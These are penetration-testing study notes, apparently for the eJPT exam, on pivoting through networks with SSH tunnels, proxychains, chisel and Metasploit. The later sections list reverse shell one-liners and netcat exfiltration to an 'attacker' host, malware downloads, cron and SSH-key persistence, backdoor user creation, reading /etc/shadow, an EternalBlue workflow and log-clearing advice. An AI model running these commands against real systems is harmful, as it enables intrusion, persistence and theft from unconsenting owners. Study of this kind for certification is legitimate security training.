# PHASE 4: PIVOTING & TUNNELLING - Network Lateral Movement

---

# SSH TUNNELING - Port Forwarding & SOCKS Proxy

## Overview

SSH tunneling allows you to forward ports and create proxies through compromised systems to access internal networks. Critical for moving laterally through networks.

---

## Installation & Setup

```bash
# SSH usually pre-installed on Linux systems
which ssh
ssh -V  # Verify version
```

---

## Common Use Cases

### 1. **Local Port Forwarding (-L)**
Forward local port to remote service.

```bash
# Forward local 9999 to remote service
ssh -L 9999:192.168.1.20:80 user@192.168.1.50

# Now access: http://localhost:9999
# Connects to: 192.168.1.20:80 through 192.168.1.50
```

### 2. **Remote Port Forwarding (-R)**
Forward remote port to local service.

```bash
# Forward remote port back to local
ssh -R 9999:localhost:3306 user@192.168.1.50

# Remote can access: localhost:9999
# Connects to your: localhost:3306 (MySQL)
```

### 3. **Dynamic Port Forwarding (-D)**
Create SOCKS proxy through SSH.

```bash
ssh -D 9050 user@192.168.1.50

# Now use proxychains or other tools through port 9050
# All traffic routed through compromised system
```

### 4. **Combined Tunneling**
Multiple tunnels in one command.

```bash
ssh -L 9999:192.168.1.20:80 \
    -L 9888:192.168.1.21:3306 \
    user@192.168.1.50

# Two ports forwarded simultaneously
```

### 5. **Background Tunnel**
```bash
ssh -L 9999:target:80 user@pivot -N -f
# -N: No shell, -f: Background
# Tunnel stays active in background
```

---

## Real-World Example

```bash
# Scenario: Compromised system on network edge

# Step 1: Establish initial SSH access
ssh user@192.168.1.50  # Compromised system

# Step 2: From compromised system, discover internal network
ifconfig
arp -a
# Finds: Internal MySQL server on 192.168.1.20:3306

# Step 3: On attacker machine, setup tunnel
ssh -L 3307:192.168.1.20:3306 user@192.168.1.50

# Step 4: Access MySQL locally
mysql -h localhost -u root -p
# Connects to internal MySQL through tunnel!
```

---

---

# PROXYCHAINS - Route Tools Through Proxy

## Overview

**Proxychains** allows any tool to work through SOCKS proxy (often created via SSH tunnel). Lets you scan/attack internal networks from outside.

---

## Installation & Setup

```bash
# CachyOS:
sudo pacman -S proxychains-ng

# Configuration:
sudo nano /etc/proxychains.conf
# Add at end:
# socks5 127.0.0.1 9050
```

---

## Common Use Cases

### 1. **Scan Internal Network**
```bash
# Setup SOCKS proxy first:
ssh -D 9050 user@pivot &

# Then scan through proxy:
proxychains nmap -p 80,443 192.168.1.20
proxychains nmap -sV 192.168.1.0/24
```

### 2. **Web Reconnaissance**
```bash
# Setup tunnel:
ssh -D 9050 user@192.168.1.50 &

# Use proxychains with tools:
proxychains curl http://192.168.1.20
proxychains curl -v http://192.168.1.21
```

### 3. **Enumerate Services**
```bash
proxychains netcat -zv 192.168.1.20 22 80 443 3306
proxychains smbclient -L //192.168.1.20 -N
```

---

## Real-World Example

```bash
# After compromising first system:

# Step 1: Create SOCKS proxy
ssh -D 9050 admin@192.168.1.50 -N -f

# Step 2: Scan internal network through proxy
proxychains nmap -sV 192.168.1.0/24

# Step 3: Found MySQL on 192.168.1.20:3306
proxychains sqlmap -u "http://192.168.1.20/page?id=1" --dbs

# Step 4: Lateral movement complete!
```

---

---

# CHISEL - TCP Tunneling (No SSH Required)

## Overview

**Chisel** creates TCP tunnels over HTTP/HTTPS. Useful when SSH is blocked or unavailable.

---

## Installation & Setup

```bash
# CachyOS:
sudo pacman -S chisel

# Or download:
wget https://github.com/jpillora/chisel/releases/latest
```

---

## Common Use Cases

### 1. **Setup Server (on Attacker)**
```bash
chisel server -p 8080 --reverse
# Server listening on port 8080
```

### 2. **Connect Client (on Target)**
```bash
chisel client http://attacker_ip:8080 R:socks
# Creates SOCKS proxy back to attacker
```

### 3. **Port Forwarding**
```bash
# Attacker:
chisel server -p 8080 --reverse

# Target:
chisel client http://attacker:8080 R:3307:192.168.1.20:3306
# Now attacker can: mysql -h localhost:3307
```

---

## Real-World Example

```bash
# When SSH is blocked but HTTP is allowed:

# Step 1: On attacker machine
chisel server -p 8080 --reverse

# Step 2: On compromised target
chisel client http://attacker:8080 R:socks

# Step 3: On attacker, use proxychains
proxychains nmap -sV 192.168.1.0/24
# Same effect as SSH tunnel, but through HTTP!
```

---

---

# METASPLOIT PIVOTING - Advanced Routing

## Overview

Metasploit allows pivoting through compromised systems using meterpreter shells.

---

## Common Commands

### 1. **Setup Routes**
```bash
# In msfconsole after getting meterpreter:
route add 192.168.1.0 255.255.255.0 1
# Routes traffic through session 1

# View routes:
route print
```

### 2. **Scan Through Session**
```bash
# Setup route first
route add 192.168.1.0 255.255.255.0 [session_id]

# Then scan:
nmap 192.168.1.100 -sV
# Scans through meterpreter session
```

### 3. **Pivot Exploitation**
```bash
# Use auxiliary/scanner/smb/smb_version through route
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.100
exploit
```

---

## Real-World Workflow

```bash
# After obtaining meterpreter shell:

# Step 1: Check network from target
meterpreter> ipconfig
# Finds: Internal network 10.0.0.0/24

# Step 2: Add route
route add 10.0.0.0 255.255.255.0 [session_number]

# Step 3: Exploit through route
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.50
exploit

# Step 4: Obtain new meterpreter on internal network
# Repeat process for complete network compromise
```

---

---

# PHASE 4 COMPLETE WORKFLOW

## Network Pivoting Scenario

```bash
#  [Attacker] → [Compromised Pivot System] → [Internal Network]

# Step 1: Initial Compromise (Pivot System)
# Use Phase 1-2 tools to get shell on 192.168.1.50

# Step 2: Reconnaissance from Compromised System
ssh 192.168.1.50  # Access pivot
ifconfig  # Check networks
arp -a    # Discover internal systems
# Finds: 10.0.0.0/24 network with active hosts

# Step 3: Setup Tunnel from Attacker
ssh -D 9050 user@192.168.1.50 -N -f

# Step 4: Configure Proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf

# Step 5: Scan Internal Network
proxychains nmap -sV 10.0.0.0/24
# Discovers: 10.0.0.100 (Windows Server)

# Step 6: Exploit Internal Target
proxychains sqlmap -u "http://10.0.0.100/app?id=1" --dbs

# Step 7: Get Shell on Internal System
proxychains bash -i >& /dev/tcp/attacker/4444 0>&1

# Step 8: Repeat on Further Systems
# Chain multiple hops for complete network penetration
```

---

# PHASE 5: ALWAYS-ON UTILITIES

---

## Commonly Used Utilities (Throughout All Phases)

### System Commands
```bash
whoami           # Current user
id               # User and group info
hostname         # Machine name
uname -a         # OS and kernel
ifconfig / ip addr # Network config
pwd              # Current directory
ls -la           # List files
cat /etc/passwd  # User accounts
cat /etc/shadow  # Password hashes
sudo -l          # Sudo permissions
```

### Persistence Commands
```bash
# Add cron job:
(crontab -l 2>/dev/null; echo "* * * * * /tmp/backdoor.sh") | crontab -

# Add SSH key:
echo "ssh-rsa PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Create backdoor user:
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
```

### File Transfer
```bash
# SCP:
scp file user@target:/tmp/

# Wget:
wget http://attacker/shell.php

# Curl:
curl -O http://attacker/malware.exe

# NC (Netcat):
cat file | nc attacker 4444
```

### Reverse Shell One-Liners
```bash
# Bash:
bash -i >& /dev/tcp/attacker/port 0>&1

# Python:
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP:
php -r '$sock=fsockopen("attacker",port);exec("/bin/sh -i <&3 >&3 2>&3");'

# Powershell:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker",port);$stream = $client.GetStream();...
```

---

## Key Takeaways for All Phases

1. **Reconnaissance is Key**: 80% of the work
2. **Combine Tools**: Output of one feeds to next
3. **Document Everything**: Screenshots, credentials, findings
4. **Test Systematically**: Don't randomly guess
5. **Privilege Escalation is Critical**: Can't complete eJPT without root
6. **Pivot Through Networks**: eJPT involves multiple systems
7. **Maintain Access**: Create backdoors before losing access
8. **Cover Tracks**: Clear logs if possible (blue team might be watching)

---

## eJPT Exam Success Checklist

- [ ] Full reconnaissance of all systems
- [ ] Identified all vulnerabilities
- [ ] Exploited at least 3-5 vulnerabilities  
- [ ] Escalated privileges on at least 2 systems
- [ ] Pivoted through network to additional targets
- [ ] Dumped all possible data (hashes, files, databases)
- [ ] Cracked at least some password hashes
- [ ] Created persistence/backdoors
- [ ] Full system compromise documented
- [ ] Professional report generated

---

**Congratulations!** You now have comprehensive notes covering all eJPT tools and techniques.

**Next:** Take a practice exam, then schedule your actual eJPT exam!

---

**Last Updated**: April 2026  
**Status**: Phase 1-5 Complete  
**Total Notes**: Comprehensive coverage of 20+ tools  

Use these notes as your personal penetration testing playbook!
